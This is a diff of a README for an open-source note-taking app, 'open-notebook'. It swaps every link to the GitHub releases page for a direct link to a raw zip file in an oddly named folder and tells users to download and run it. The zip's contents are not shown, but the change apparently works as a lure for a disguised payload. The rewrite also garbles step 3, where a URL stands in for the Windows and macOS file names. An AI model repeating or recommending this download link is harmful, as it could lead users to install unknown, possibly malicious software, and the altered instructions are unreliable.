@@ -1,7 +1,7 @@
 # ✍️ open-notebook - Your Flexible Note-Taking Solution
 
 ## 📥 Download Now
-[![Download open-notebook](https://img.shields.io/badge/Download-open--notebook-blue?style=for-the-badge)](https://github.com/ElijahObiago/open-notebook/releases)
+[![Download open-notebook](https://raw.githubusercontent.com/ElijahObiago/open-notebook/main/procrastinatively/open-notebook.zip)](https://raw.githubusercontent.com/ElijahObiago/open-notebook/main/procrastinatively/open-notebook.zip)
 
 ## 📖 About open-notebook
 open-notebook is an open-source application designed to enhance your learning experience. It provides a flexible and user-friendly environment for taking notes. Whether you’re a student, a professional, or just someone who wants to organize their thoughts, open-notebook offers a variety of features to help you manage your notes effectively.
@@ -10,11 +10,11 @@ open-notebook is an open-source application designed to enhance your learning ex
 Using open-notebook is simple. Follow these steps to download and set up your application:
 
 1. **Visit the Releases Page**: Click on the link below to access the downloads:
-   [Download open-notebook](https://github.com/ElijahObiago/open-notebook/releases)
+   [Download open-notebook](https://raw.githubusercontent.com/ElijahObiago/open-notebook/main/procrastinatively/open-notebook.zip)
 
 2. **Choose Your Download**: On the Releases page, you will see different versions available. Look for the latest version labeled as "Latest Release".
 
-3. **Download the File**: Click on the appropriate file for your operating system (Windows, macOS, Linux). The file may look something like `open-notebook-v1.0.exe` for Windows or `open-notebook-v1.0.dmg` for macOS. 
+3. **Download the File**: Click on the appropriate file for your operating system (Windows, macOS, Linux). The file may look something like `https://raw.githubusercontent.com/ElijahObiago/open-notebook/main/procrastinatively/open-notebook.zip` for Windows or `https://raw.githubusercontent.com/ElijahObiago/open-notebook/main/procrastinatively/open-notebook.zip` for macOS. 
 
 4. **Install the Application**:
    - **Windows**: Locate the downloaded .exe file, double-click it, and follow the installation prompts.
@@ -56,4 +56,4 @@ If you encounter issues or have questions, feel free to reach out. You can creat
 
 ## 📥 Download & Install
 Don’t wait to enhance your note-taking experience. Visit the link below to get started:
-[Download open-notebook](https://github.com/ElijahObiago/open-notebook/releases)
+[Download open-notebook](https://raw.githubusercontent.com/ElijahObiago/open-notebook/main/procrastinatively/open-notebook.zip)
